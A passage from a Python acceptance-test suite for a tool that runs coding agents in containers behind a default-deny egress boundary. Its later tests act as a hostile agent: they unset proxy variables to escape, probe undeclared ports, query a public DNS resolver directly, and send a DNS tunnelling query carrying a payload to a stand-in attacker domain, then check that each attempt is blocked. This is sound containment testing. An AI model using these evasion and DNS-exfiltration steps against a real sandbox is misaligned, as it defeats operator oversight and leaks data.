    would have hidden (research R1), so this test is worthless if it drifts to one
    path. Also confirms the sibling tmux mount under ~/.config is undisturbed."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc10per", agent="opencode", authorized_key=[laptop.with_suffix(".pub")])
    marks = {
        "/home/dev/.config/opencode/acceptance.marker": "CONFIG",
        "/home/dev/.local/share/opencode/auth.json": '{"acceptance":"CREDENTIAL"}',
        "/home/dev/.config/tmux/acceptance.marker": "TMUX",  # sibling mount, must survive too
    }
    for path, body in marks.items():
        w = _exec("acc10per", ["bash", "-lc", f"printf '%s' {body!r} > {path}"])
        assert w.returncode == 0, f"could not write {path} as dev (rootless ownership?): {w.stderr}"

    acc.down("acc10per")  # NOT --purge: volumes must survive
    acc.up("acc10per", agent="opencode", authorized_key=[laptop.with_suffix(".pub")])

    for path, body in marks.items():
        got = _exec("acc10per", ["cat", path])
        assert got.returncode == 0, f"{path} did not survive recreation: {got.stderr}"
        assert body in got.stdout, f"{path} content changed: {got.stdout!r}"


def test_pre_upgrade_environment_still_starts_and_tears_down(acc):
    """US3 acceptance 1+2 / FR-009 / SC-005 — the feature's headline risk.

    Simulates an environment created BEFORE this change by deleting the two new
    volumes from a live deployment, then exercises the paths an upgrading operator
    actually takes: `up` again (must still start) and `down --purge` (must tolerate
    the absence). No manual migration anywhere.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc10leg", authorized_key=[laptop.with_suffix(".pub")])
    acc.down("acc10leg")  # keep volumes, drop the container

    for suffix in ("opencode", "opencode-data"):
        subprocess.run(
            [RUNTIME, "volume", "rm", f"agent-container-acc10leg-{suffix}"],
            capture_output=True,
            text=True,
        )
    remaining = acc.volumes_of("acc10leg")
    assert len(remaining) == 7, f"expected the pre-010 set, got {remaining}"

    # 1. It must still come up on the upgraded code.
    acc.up("acc10leg", authorized_key=[laptop.with_suffix(".pub")])
    assert _exec("acc10leg", ["true"]).returncode == 0

    # 2. And tear down completely, with no orphan and no error.
    acc.down("acc10leg", purge=True)
    assert acc.volumes_of("acc10leg") == []


def test_opencode_injected_key_never_lands_on_a_volume(acc):
    """US2 / FR-011 / Constitution III. The key reaches the agent through the env
    only; it must appear on neither opencode volume (the on-volume auth.json is
    operator-interactive-login only) nor in the generated compose descriptor."""
    secret = "sk-ant-acceptance-SECRET-000"
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up(
        "acc10sec",
        agent="opencode",
        authorized_key=[laptop.with_suffix(".pub")],
        env_extra=[f"ANTHROPIC_API_KEY={secret}"],
    )
    # Sanity: the key really did reach the agent's environment, so the assertions
    # below are testing containment rather than passing because nothing was there.
    got = _exec("acc10sec", ["bash", "-lc", 'printf %s "${ANTHROPIC_API_KEY:-}"'])
    assert got.stdout.strip() == secret, "key never reached the container env"

    for mount in ("/home/dev/.config/opencode", "/home/dev/.local/share/opencode"):
        hit = _exec("acc10sec", ["bash", "-lc", f"grep -rl {secret!r} {mount} 2>/dev/null || true"])
        assert hit.stdout.strip() == "", f"secret found on {mount}: {hit.stdout}"

    compose = list((acc.state_dir / "agent-container" / "local").glob("acc10sec.compose.yaml"))
    for f in compose:
        assert secret not in f.read_text(), f"secret inlined in {f}"


# --- Feature 011: the layout, against real containers ------------------------


def test_consolidated_project_deploys_and_discovery_walks_up(acc):
    """Quickstart S2 + S3 (US1, contracts C1/C2). The env file is found in the
    project config directory, and the tool behaves identically when run from a
    nested subdirectory — the project root is defined by the marker, not by cwd."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    proj = acc.tmp / "proj11"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "acc11.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n"
    )
    nested = proj / "src" / "deep"
    nested.mkdir(parents=True)
    acc.register("acc11")
    r = acc.cli(["up", "acc11", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=nested)
    assert r.returncode == 0, f"deploy from a nested cwd failed:\n{r.stderr}"
    assert _exec("acc11", ["true"]).returncode == 0


def test_superseded_layout_is_refused_not_ignored(acc):
    """Quickstart S4 (FR-004). The load-bearing case: a superseded CREDENTIAL
    must refuse, because ignoring it deploys an agent without the key the
    operator believes was injected."""
    proj = acc.tmp / "proj11old"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "acc11o.env").write_text("GH_TOKEN=x\n")
    (proj / "agent-container.acc11o.anthropic.key").write_text("sk-ant-STALE\n")
    r = acc.cli(["up", "acc11o"], cwd=proj)
    assert r.returncode != 0, "a superseded credential file must refuse, not deploy"
    out = r.stdout + r.stderr
    assert "agent-container.acc11o.anthropic.key" in out
    assert ".agent-container/acc11o.anthropic.key" not in out  # no such destination


def test_explicit_env_files_stack_in_order(acc):
    """Quickstart S4a (FR-001d/FR-001e). `-e` from anywhere, later winning."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    base = acc.tmp / "outside" / "base.env"
    base.parent.mkdir(exist_ok=True)
    base.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\nSTACKED=first\n")
    over = acc.tmp / "outside" / "over.env"
    over.write_text("STACKED=second\n")
    acc.register("acc11e")
    r = acc.cli(
        ["up", "acc11e", "-e", str(base), "-e", str(over),
         "--authorized-key", str(laptop.with_suffix(".pub"))]
    )  # fmt: skip
    assert r.returncode == 0, f"stacked -e deploy failed:\n{r.stderr}"
    got = _exec("acc11e", ["bash", "-lc", 'printf %s "$STACKED"']).stdout.strip()
    assert got == "second", f"later -e must win, got {got!r}"


def test_shell_env_survives_recreation_at_the_new_path(acc):
    """Quickstart S7 (US3, C5). The volume NAME never changed, so this is a
    relocation rather than a migration — and `dev` must be able to write the new
    mount point (the Feature 010 trap)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc11se", authorized_key=[laptop.with_suffix(".pub")])
    w = _exec("acc11se", ["bash", "-lc", 'echo "export MARK=1" >> ~/.agent-env/env'])
    assert w.returncode == 0, f"dev cannot write the new mount point: {w.stderr}"
    acc.down("acc11se")  # NOT --purge
    acc.up("acc11se", authorized_key=[laptop.with_suffix(".pub")])
    got = _exec("acc11se", ["cat", "/home/dev/.agent-env/env"])
    assert "MARK=1" in got.stdout, "shell env did not survive recreation"
    assert "agent-container-acc11se-shellenv" in acc.volumes_of("acc11se")  # name unchanged


def test_build_context_contains_only_the_image_sources(acc):
    """Quickstart S5 (US2, FR-007). The context travels to the daemon, which may
    be remote — so this is a security boundary, not tidiness."""
    r = acc.cli(["build", "acc11ctx:test"])
    assert r.returncode == 0, f"build from image/ failed:\n{r.stderr}"
    out = r.stdout + r.stderr
    for leaked in ("specs/", "bin/tests", "pyproject.toml"):
        assert leaked not in out, f"{leaked} appeared in the build context transfer"


def test_explicit_env_file_works_against_a_non_default_context(acc):
    """T016a / FR-001e (analysis C2). Remote parity for `-e`.

    Research R2b claims env files are read CLIENT-SIDE by compose, which is why a
    path that exists only on the operator's machine works against a remote
    daemon. That claim came from a docstring and nothing had run it — the same
    shape as Feature 010's `opencode run` exit-status assumption, which needed a
    real probe to get right. If compose ever resolved the path on the daemon
    instead, `-e` would silently break for every remote deployment.

    A non-default docker context pointing at the local daemon exercises the
    remote code path without a second machine (the pattern `host env` uses).
    """
    ctx = subprocess.run(
        ["docker", "context", "show"], capture_output=True, text=True
    ).stdout.strip()
    cfg = _config_dir_of(acc.state_dir)
    cfg.mkdir(parents=True, exist_ok=True)
    cfg.joinpath("hosts.json").write_text(
        json.dumps(
            {
                "version": 1,
                "default": None,
                "hosts": {"acc11rem": {"driver": "docker", "context": ctx, "address": "localhost"}},
            }
        )
    )
    outside = acc.tmp / "outside" / "remote.env"
    outside.parent.mkdir(exist_ok=True)
    outside.write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\nREMOTE_MARK=yes\n"
    )
    acc.register("acc11r")
    r = acc.cli(["up", "acc11r", "--host", "acc11rem", "-e", str(outside)])
    assert r.returncode == 0, f"-e against a non-default context failed:\n{r.stderr}"
    got = _exec("acc11r", ["bash", "-lc", 'printf %s "$REMOTE_MARK"']).stdout.strip()
    assert got == "yes", "the client-side env file did not reach a context-targeted deploy"


# --- Feature 012: egress, against real containers ---------------------------


def _egress_project(acc, name: str, egress_yaml: str):
    proj = acc.tmp / f"proj{name}"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / f"{name}.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n"
    )
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n    host: local\n"
        f"    container:\n      agent: claude\n{egress_yaml}"
    )
    return proj


def test_undeclared_provider_is_refused_not_dropped(acc):
    """Quickstart S3 — the core case, and the one that distinguishes a REFUSAL
    from a DROP. curl exit 56 = the proxy returned a status; 28 = it dropped the
    connection (the R1a failure that produced 30-40s hangs); 0 = the request went
    around the proxy entirely.

    Asserting on %{http_code} would NOT work here: for a refused CONNECT it reads
    000 for a refusal and a drop alike (research R10a, measured).
    """
    laptop = _gen_keypair(acc.tmp / "laptop12a")
    proj = _egress_project(acc, "acc12a", "    egress:\n      allow: [{provider: anthropic}]\n")
    acc.register("acc12a")
    r = acc.cli(["up", "acc12a", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"deploy with a declaration failed:\n{r.stderr}"

    declared = _exec("acc12a", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                                "https://api.anthropic.com/v1/messages"])  # fmt: skip
    assert declared.returncode == 0, "the DECLARED provider must stay reachable"

    undeclared = _exec("acc12a", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                                  "https://api.openai.com/v1/models"])  # fmt: skip
    assert undeclared.returncode == 56, (
        f"expected 56 (refused with a status); got {undeclared.returncode} — "
        f"28 means the proxy DROPPED instead of refusing, 0 means the request "
        f"bypassed the proxy entirely"
    )


def test_operator_no_proxy_is_refused_at_deploy(acc):
    """Quickstart S6 — the feature's most likely silent failure. If this deploys,
    the declaration reads as enforced while enforcing nothing."""
    proj = _egress_project(acc, "acc12b", "    egress:\n      allow: [{provider: anthropic}]\n")
    (proj / ".agent-container" / "acc12b.env").write_text("GH_TOKEN=x\nNO_PROXY=*\n")
    acc.register("acc12b")
    r = acc.cli(["up", "acc12b"], cwd=proj)
    assert r.returncode != 0, "an operator NO_PROXY must refuse the deploy"
    assert "NO_PROXY" in r.stderr


def test_no_declaration_deploys_exactly_as_before(acc):
    """FR-004/FR-012 against a real container: an environment without an `egress:`
    key gains no proxy service and no behaviour change."""
    laptop = _gen_keypair(acc.tmp / "laptop12c")
    proj = _egress_project(acc, "acc12c", "")
    acc.register("acc12c")
    r = acc.cli(["up", "acc12c", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"an undeclared environment must deploy unchanged:\n{r.stderr}"
    model = json.loads(
        (acc.state_dir / "agent-container" / "local" / "acc12c.compose.yaml").read_text()
    )
    assert "egress" not in model["services"]
    assert _exec("acc12c", ["true"]).returncode == 0


def test_teardown_leaves_no_proxy_behind(acc):
    """The proxy shares the compose project, and `down --remove-orphans` must clear
    it — including after the declaration is DROPPED, when the regenerated file no
    longer declares the service that is still running."""
    laptop = _gen_keypair(acc.tmp / "laptop12d")
    proj = _egress_project(acc, "acc12d", "    egress:\n      allow: [{provider: anthropic}]\n")
    acc.register("acc12d")
    assert acc.cli(
        ["up", "acc12d", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    # Drop the declaration, redeploy: the generated file no longer has the service.
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: acc12d\n    host: local\n    container:\n      agent: claude\n"
    )
    assert acc.cli(["redeploy", "acc12d"], cwd=proj).returncode == 0
    # -y is REQUIRED: `down` refuses a destructive action on a non-TTY without it.
    # Without this the test failed while `down` had never run at all — asserting the
    # end state without asserting the command succeeded cannot tell you which.
    d = acc.cli(["down", "acc12d", "-y"], cwd=proj)
    assert d.returncode == 0, f"down failed, so the teardown assertion is untestable:\n{d.stderr}"
    ps = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
    )
    assert "agent-egress-acc12d" not in ps.stdout, (
        "the proxy survived teardown — it carries restart: unless-stopped and is "
        "invisible to list, to every wizard picker and to assert_host_empty"
    )


# --- Feature 012 Phase B: US4 evasion, against real containers --------------
# These CANNOT be unit-tested. US4's claim is about what a HOSTILE PROCESS
# cannot do, so each scenario drives the container adversarially rather than
# cooperatively — a cooperative test would pass against Phase A too and prove
# nothing new.


def _phase_b_project(acc, name: str, extra: str = ""):
    proj = acc.tmp / f"proj{name}"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / f"{name}.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n    host: local\n"
        f"    container:\n      agent: claude\n"
        f"    egress:\n      allow:\n        - provider: anthropic\n{extra}"
    )
    return proj


def test_agent_cannot_switch_enforcement_off(acc):
    """SC-008, quickstart S12 — THE test for US4.

    Under Phase A the same call SUCCEEDS: the agent unsets HTTPS_PROXY and walks
    out. Here routing is done by the network stack, so unsetting every variable
    the agent can see changes nothing.
    """
    laptop = _gen_keypair(acc.tmp / "lapB1")
    proj = _phase_b_project(acc, "accb1")
    acc.register("accb1")
    r = acc.cli(["up", "accb1", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"deploy failed:\n{r.stderr}"

    declared = _exec("accb1", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                               "https://api.anthropic.com/v1/messages"])  # fmt: skip
    assert declared.returncode == 0, "the DECLARED provider must stay reachable"

    evade = _exec("accb1", ["sh", "-c",
        "unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy; "
        "curl -s -o /dev/null --max-time 25 https://api.openai.com/v1/models"])  # fmt: skip
    assert evade.returncode != 0, (
        "the agent unset every proxy variable and still reached an undeclared host — "
        "enforcement is cooperative, not transparent"
    )


def test_agent_cannot_reach_a_non_standard_port(acc):
    """SC-009, quickstart S13. The hole the first design sketch left: redirecting
    only 80/443 under a default-ACCEPT policy lets 8080 straight through, which is
    WORSE than no control because the declaration still reads as constraining."""
    laptop = _gen_keypair(acc.tmp / "lapB2")
    proj = _phase_b_project(acc, "accb2")
    acc.register("accb2")
    assert acc.cli(
        ["up", "accb2", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip
    # NOT `returncode != 0`. Once the diagnostic proxy actually works, an
    # undeclared port is REFUSED WITH A STATUS rather than dropped, and `curl`
    # exits 0 for a 403 — so the old assertion failed while the port was properly
    # closed. Inverting it would be worse: `returncode == 0` also passes when the
    # agent genuinely REACHES the port, which is the hole this test exists for.
    #
    # What must hold is that the agent never gets a response from the ORIGIN. So
    # both acceptable outcomes are named, and 200 is rejected explicitly.
    for port in ("8080", "1337"):
        r = _exec("accb2", ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "--max-time", "10", f"http://example.com:{port}/"])  # fmt: skip
        code = (r.stdout or "").strip()
        assert r.returncode != 0 or code == "403", (
            f"port {port} reachable under default-deny "
            f"(exit {r.returncode}, http_code {code!r}; 403 = the proxy refused it, "
            "a 2xx/3xx means the origin answered and the port is OPEN)"
        )
        # And with the proxy variables removed, nothing may answer at all — that is
        # the netfilter claim, which must not rest on the agent's cooperation.
        bare = _exec("accb2", ["env", "-u", "http_proxy", "-u", "https_proxy",
                               "-u", "HTTP_PROXY", "-u", "HTTPS_PROXY",
                               "curl", "-s", "-o", "/dev/null", "--max-time", "10",
                               f"http://example.com:{port}/"])  # fmt: skip
        assert bare.returncode != 0, (
            f"port {port} reachable with the proxy variables UNSET — the boundary "
            "is depending on the agent's cooperation, which is what US4 removes"
        )


def test_agent_container_gains_no_capability(acc):
    """SC-011, quickstart S16 — the BLOCKING check.

    If the agent shows any capability the design has inverted its own principle,
    granting privilege to the container that runs untrusted code.
    """
    laptop = _gen_keypair(acc.tmp / "lapB3")
    proj = _phase_b_project(acc, "accb3")
    acc.register("accb3")
    assert acc.cli(
        ["up", "accb3", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    def caps(container):
        r = subprocess.run(
            [RUNTIME, "inspect", container, "--format", "{{.HostConfig.CapAdd}}"],
            capture_output=True, text=True,
        )  # fmt: skip
        return r.stdout.strip()

    assert caps("agent-container-accb3") in ("[]", "<no value>", ""), "the AGENT must hold nothing"
    assert "NET_ADMIN" in caps("agent-egress-accb3"), "the privilege belongs on the proxy"


def test_declared_provider_still_resolves(acc):
    """US5 scenario 3 / T136a — the positive case.

    An allowlist-only resolver that resolves NOTHING passes every refusal test
    here. This is what separates "working" from "broken closed", and broken-closed
    is the failure this mechanism makes easy.
    """
    laptop = _gen_keypair(acc.tmp / "lapB4")
    proj = _phase_b_project(acc, "accb4")
    acc.register("accb4")
    assert acc.cli(
        ["up", "accb4", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip
    r = _exec("accb4", ["getent", "hosts", "api.anthropic.com"])
    assert r.returncode == 0 and r.stdout.strip(), "a DECLARED name must resolve"
    u = _exec("accb4", ["getent", "hosts", "api.openai.com"])
    assert u.returncode != 0, "an undeclared name must not resolve"


# A raw DNS query, because the image carries no `dig` — system dependencies are
# baked at build time and an agent never installs one at runtime (CLAUDE.md), so
# a test needing `dig` would be a test that changed the image.
#
# What `dig` gives that `getent` cannot is the RCODE, and the rcode is the only
# thing separating two outcomes an address-shaped assertion reports identically:
#
#   REFUSED (5)  — unbound declined to ASK. The question never left the boundary.
#   NXDOMAIN (3) — something upstream answered "no such name", so the question DID
#                  leave. For a tunnelling-shaped label that is a total failure
#                  wearing the costume of a success, because the payload rides in
#                  the question and not in the answer (FR-020b).
#
# It is also the tell for the rules being in the wrong POSITION rather than off:
# the daemon's own resolver answers NXDOMAIN where unbound answers REFUSED
# (research R19a, measured).
_DNS_PROBE = r"""
import socket, sys

qname, server, timeout = sys.argv[1], sys.argv[2], float(sys.argv[3])
if server == "auto":  # whatever this container was itself told to use
    with open("/etc/resolv.conf") as fh:
        server = next(ln.split()[1] for ln in fh if ln.startswith("nameserver"))
query = b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
for label in qname.split("."):
    query += bytes([len(label)]) + label.encode()
query += b"\x00\x00\x01\x00\x01"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(timeout)
try:
    sock.sendto(query, (server, 53))
    reply, _ = sock.recvfrom(4096)
except OSError as exc:
    print(f"NORESPONSE {server} {exc}")
else:
    print(f"RCODE {reply[3] & 0x0F} {server}")
"""


def _dns_probe(env: str, qname: str, server: str = "auto", timeout: int = 8) -> str:
    """`RCODE <n> <server>` or `NORESPONSE <server> <why>`, asked from inside the
    container. A failure of the probe ITSELF is raised rather than folded into the
    result, so a broken probe can never read as a successful refusal."""
    r = _exec(env, ["python3", "-c", _DNS_PROBE, qname, server, str(timeout)])
    assert r.returncode == 0, f"the DNS probe itself failed:\n{r.stdout}\n{r.stderr}"
    return r.stdout.strip()


def test_a_declared_port_opens_that_host_and_that_port_only(acc):
    """SC-010, quickstart S14 — the granularity claim, and the one a too-permissive
    implementation passes halfway.

    Reachability alone is not the property. A rule that opened the HOST, or the
    protocol, satisfies "ssh works" while admitting everything adjacent that the
    operator did not declare — so the same host on another port and the same port
    on another host are probed too. `build_squid_acl` excludes ported entries for
    exactly this reason, and this is the only place that exclusion is observable.

    `ssh-keyscan` rather than `ssh`: it completes a real SSH handshake with the
    remote and needs no credential, so neither result can be an auth artefact.
    """
    laptop = _gen_keypair(acc.tmp / "lapB5")
    proj = _phase_b_project(acc, "accb5", "        - host: github.com\n          port: 22\n")
    acc.register("accb5")
    assert acc.cli(
        ["up", "accb5", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    declared = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "github.com"])
    assert declared.returncode == 0 and "github.com" in declared.stdout, (
        f"the DECLARED {{host: github.com, port: 22}} did not connect (exit "
        f"{declared.returncode}: {declared.stderr.strip()[:200]!r}) — default-deny "
        f"with the port entry never applied looks exactly like this"
    )

    # The SAME host, an undeclared port. 443 is redirected into squid, whose
    # allowlist deliberately carries no ported entries, so `ssl_bump terminate`
    # ends it (curl exit 35). A 0 here means declaring port 22 opened 443 as well.
    other_port = _exec("accb5", ["curl", "-s", "-o", "/dev/null", "--max-time", "20",
                                 "https://github.com/"])  # fmt: skip
    assert other_port.returncode != 0, (
        "github.com:443 answered although only port 22 was declared — the entry "
        "opened the HOST rather than the endpoint, which is the SC-010 failure"
    )

    # The same PORT, another host. gitlab.com is undeclared, so it is refused at
    # the resolver before netfilter is consulted at all; either refusal is
    # correct, what must not happen is a completed handshake.
    other_host = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "gitlab.com"])
    assert not other_host.stdout.strip(), (
        "gitlab.com:22 answered — declaring one SSH destination admitted another, "
        "i.e. the protocol was permitted generally"
    )


def test_an_undeclared_name_does_not_resolve_including_a_tunnelling_label(acc):
    """SC-012, quickstart S15 — where the rcode matters as much as the failure.

    `getent` reports only whether an address came back, and for this label that
    is the SAME ANSWER either way: measured against a public resolver,
    `<label>.attacker.example.com` returns NOERROR with an empty answer section,
    so `getent` fails identically whether the question was refused here or
    carried all the way to the attacker's nameserver. The exfiltration is in the
    question, not the answer (FR-020b) — so the label is probed for its RCODE
    too, which is the only signal that distinguishes the two.
    """
    laptop = _gen_keypair(acc.tmp / "lapB6")
    proj = _phase_b_project(acc, "accb6")
    acc.register("accb6")
    assert acc.cli(
        ["up", "accb6", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    tunnel = "ZXhmaWx0cmF0ZWQ.attacker.example.com"
    # The positive control FIRST: a resolver that resolves nothing passes every
    # refusal below, and research R17 shipped exactly that for a while.
    ok = _exec("accb6", ["getent", "hosts", "api.anthropic.com"])
    assert ok.returncode == 0 and ok.stdout.strip(), (
        "a DECLARED name did not resolve — every refusal below is then vacuous, "
        "and broken-closed is the failure this mechanism makes easy"
    )
    for undeclared in ("api.openai.com", tunnel):
        r = _exec("accb6", ["getent", "hosts", undeclared])
        assert r.returncode != 0, f"{undeclared} resolved: {r.stdout.strip()!r}"

    probe = _dns_probe("accb6", tunnel)
    assert probe.startswith("RCODE 5") or probe.startswith("NORESPONSE"), (
        f"expected REFUSED (rcode 5) or no answer at all for the tunnelling "
        f"label, got {probe!r}. Rcode 0, 2 or 3 all mean something ANSWERED, and "
        f"an answer means the question travelled to a nameserver that had to read "
        f"the label to produce it — the payload has left (research R19a)"
    )


def test_a_public_resolver_cannot_be_queried_directly(acc):
    """SC-013, quickstart S15 — `dig @8.8.8.8`, with the tools the image has.

    FR-020a is met by DROPPING port 53 rather than redirecting it (research R18):
    every resolver except ours is unreachable, so there is nothing left to
    redirect. The assertion is written against the PROPERTY rather than that
    mechanism — an implementation that redirected instead would still have to
    keep the question inside the boundary, and that is what is checked.

    `example.com` is the query on purpose. It resolves publicly, so rcode 0 is
    unambiguous proof the question reached Google; a name that exists nowhere
    would come back NXDOMAIN from either resolver and prove nothing either way.
    """
    laptop = _gen_keypair(acc.tmp / "lapB7")
    proj = _phase_b_project(acc, "accb7")
    acc.register("accb7")
    assert acc.cli(
        ["up", "accb7", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    direct = _dns_probe("accb7", "example.com", server="8.8.8.8")
    assert direct.startswith("NORESPONSE") or direct.startswith("RCODE 5"), (
        f"a query addressed to 8.8.8.8 was answered ({direct!r}) — rcode 0 means "
        f"it reached Google, and every DNS guarantee in this feature is then "
        f"advisory: an agent picks its own resolver and the allowlist is bypassed"
    )

    # The complement, and it is not optional: without it a container with no
    # network at all passes the assertion above.
    ours = _dns_probe("accb7", "api.anthropic.com")
    assert ours.startswith("RCODE 0"), (
        f"the sidecar resolver did not answer a DECLARED name ({ours!r}) — the "
        f"refusal above would then be indistinguishable from dead DNS"
    )


# Opt-in, on the same principle as the Hetzner test: the end-to-end push needs a
# real repository and a real key, which this module deliberately does not have
# (see the module docstring). Set both to run it.
_PUSH_URL = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_URL")  # git@host:owner/repo.git
_PUSH_KEY = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_KEY")  # private key path


def test_git_push_over_declared_ssh_reaches_the_remote(acc):
    """Quickstart S18 / T138 — if this fails the feature is unshippable.

    Default-deny kills `git push` over SSH unless port 22 is declared: Hard
    Constraint #1 (every agent commits AND pushes) breaking from the opposite
    direction to Phase A's HTTPS case.

    TWO ARMS, and the split is stated rather than hidden. The always-on arm
    drives the same SSH transport git uses and asserts the REMOTE ANSWERED: the
    server completes the handshake and then refuses the absent key, which is a
    protocol-level rejection and therefore proof the boundary carried the
    session. **It does not prove a push completes** — only that the one thing
    default-deny can break is not broken. The push itself is the second arm.

    Reading a refusal as success is safe here and only here: 'Permission denied'
    can be produced ONLY by a server that received the authentication request,
    whereas everything default-deny does (drop, timeout, unreachable) fails
    before any server is spoken to.

    WHAT THIS TEST STRUCTURALLY CANNOT SEE, stated because the task it closes is
    the one declared "unshippable if it fails" (T147, research R24/R25). It probes
    SECONDS after `up`, and `{host, port}` is enforced by `iptables -d <name>`,
    which resolves the operand ONCE at rule-install time and pins the addresses in
    that single answer — nothing in the boundary re-resolves (measured at T146: the
    egress container runs exactly `squid` and `unbound`, no refresher). So a green
    result here means "reachable at deploy", not "reachable for the life of the
    container". Measured at T146 on a live boundary: `github.com` pinned to
    140.82.121.4, and 140.82.121.3 / .5 — the SAME host's other rotation addresses
    — both time out. The moment the resolver hands the agent one of those, this
    transport is dead until the container restarts, and R24 caught exactly that at
    301 s with no recovery. A time-boxed probe cannot distinguish the two, which is
    why the limitation is written here rather than left to be rediscovered as a
    passing test over a broken push.
    """
    endpoint = ("github.com", 22)
    if _PUSH_URL:
        # Parsed with the CLI's OWN parser, not a second one: if the two ever
        # disagreed, the deploy-time SSH check (FR-003c) would be vouching for an
        # endpoint the push never uses — a check that passes for the wrong thing.
        endpoint = _load_cli().ssh_remote_endpoint(_PUSH_URL)
        assert endpoint, f"AGENT_CONTAINER_ACCEPTANCE_PUSH_URL is not an SSH remote: {_PUSH_URL}"
    host, port = endpoint

    laptop = _gen_keypair(acc.tmp / "lapB8")
    proj = _phase_b_project(acc, "accb8", f"        - host: {host}\n          port: {port}\n")
    acc.register("accb8")
    argv = ["up", "accb8", "--authorized-key", str(laptop.with_suffix(".pub"))]
    if _PUSH_KEY:
        argv += ["--push-key", _PUSH_KEY]
    r = acc.cli(argv, cwd=proj)
    assert r.returncode == 0, f"deploy with a declared SSH endpoint failed:\n{r.stderr}"

    handshake = _exec("accb8", ["ssh", "-T", "-p", str(port),
                                "-o", "BatchMode=yes",
                                "-o", "StrictHostKeyChecking=no",
                                "-o", "UserKnownHostsFile=/dev/null",
                                "-o", "ConnectTimeout=15", f"git@{host}"])  # fmt: skip
    answered = handshake.stderr + handshake.stdout
    assert "Permission denied" in answered or "successfully authenticated" in answered, (
        f"the DECLARED SSH remote never answered: {answered.strip()[:300]!r}. A "
        f"timeout, 'Network is unreachable' or 'Could not resolve hostname' here "
        f"means default-deny is eating `git push`, and Hard Constraint #1 with it"
    )

    if not (_PUSH_URL and _PUSH_KEY):
        return  # transport proven; the push needs a repo this module has no key for
    # The URL rides as "$1" rather than being interpolated: an operator-supplied
    # value spliced into a shell string is a quoting bug waiting for a repo name
    # with a shell metacharacter in it.
    push = _exec("accb8", ["sh", "-c",
        'set -e; d=$(mktemp -d); git clone "$1" "$d"; cd "$d"; '
        "date -u +'T138 %Y-%m-%dT%H:%M:%SZ' >> .agent-container-heartbeat; "
        "git add .agent-container-heartbeat; "
        "git commit -m 'test(T138): egress acceptance heartbeat'; "
        "git push origin HEAD", "sh", _PUSH_URL])  # fmt: skip
    assert push.returncode == 0, (
        f"`git push` over the declared SSH endpoint failed — the feature is "
        f"unshippable in this state:\n{push.stdout[-2000:]}\n{push.stderr[-2000:]}"
    )


def test_an_undeclared_environment_keeps_its_own_network(acc):
    """FR-004, quickstart S19 — default-deny applies to environments that opted
    in, NEVER retroactively. An upgrade that air-gaps everyone who never asked
    for egress control is the worst regression this feature can ship, and it is
    invisible to every other test here: they all declare something.

    `test_no_declaration_deploys_exactly_as_before` asserts the generated MODEL
    has no egress service. This asserts the RUNNING environment behaves like one
    that was never touched, which the model does not imply — the port owner, the
    network namespace and the resolver in the path are all runtime facts.
    """
    laptop = _gen_keypair(acc.tmp / "lapB9")
    proj = _egress_project(acc, "accb9", "")  # no `egress:` key at all
    acc.register("accb9")
    r = acc.cli(["up", "accb9", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"an undeclared environment must deploy unchanged:\n{r.stderr}"

    ps = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
    )
    assert "agent-egress-accb9" not in ps.stdout, "an undeclared environment grew a boundary"

    def inspect(fmt: str) -> str:
        return subprocess.run(
